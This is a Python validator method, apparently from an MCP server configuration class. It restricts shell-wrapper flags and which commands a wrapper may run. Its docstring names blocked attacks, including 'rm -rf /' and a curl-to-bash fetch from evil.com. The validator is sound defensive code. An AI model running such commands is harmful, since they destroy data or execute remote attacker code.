def validate_shell_wrapper_args(self) -> "MCPServerConfig":
        """Validate shell wrapper usage and -c/-/c flags.

        This validator:
        1. Ensures -c and /c flags are only used with shell wrappers (cmd/sh/bash)
        2. Validates that shell wrappers only wrap allowed commands

        This prevents attacks like:
        - cmd /c rm -rf /
        - sh -c "curl evil.com | bash"
        - python -c "malicious code"  (blocked: -c not allowed for python)

        While allowing legitimate patterns like:
        - cmd /c uvx mcp-server
        - sh -c "npx @modelcontextprotocol/server-filesystem"

        Returns:
            Self if validation passes

        Raises:
            ValueError: If validation fails
        """
        if not self.command or not self.args:
            return self

        base_command = _extract_base_command(self.command)
        has_shell_exec_flag = any(arg in SHELL_EXEC_FLAGS for arg in self.args)

        # Shell exec flags (-c, /c) are ONLY allowed with shell wrappers
        if has_shell_exec_flag and base_command not in SHELL_WRAPPERS:
            msg = f"Flag -c or /c is only allowed with shell wrappers (cmd/sh/bash), not with '{base_command}'"
            logger.warning("MCP -c flag rejected for non-shell command: {}", base_command)
            raise ValueError(msg)

        # For shell wrappers, validate the wrapped command
        if base_command in SHELL_WRAPPERS:
            # Find the wrapped command after shell exec flag
            wrapped_command = None
            for i, arg in enumerate(self.args):
                if arg in SHELL_EXEC_FLAGS and i + 1 < len(self.args):
                    wrapped_command = self.args[i + 1]
                    break

            if wrapped_command:
                wrapped_base = _extract_base_command(wrapped_command)
                # Shell wrappers can only wrap other allowed commands (not other shells)
                allowed_wrapped = ALLOWED_MCP_COMMANDS - SHELL_WRAPPERS

                if wrapped_base not in allowed_wrapped:
                    msg = (
                        f"Shell wrapper '{base_command}' cannot execute '{wrapped_base}'. "
                        f"Only these commands can be wrapped: {', '.join(sorted(allowed_wrapped))}"
                    )
                    logger.warning(
                        "MCP shell wrapper rejected: {} {} -> wrapped command '{}' not allowed",
                        base_command,
                        self.args,
                        wrapped_base,
                    )
                    raise ValueError(msg)

        return self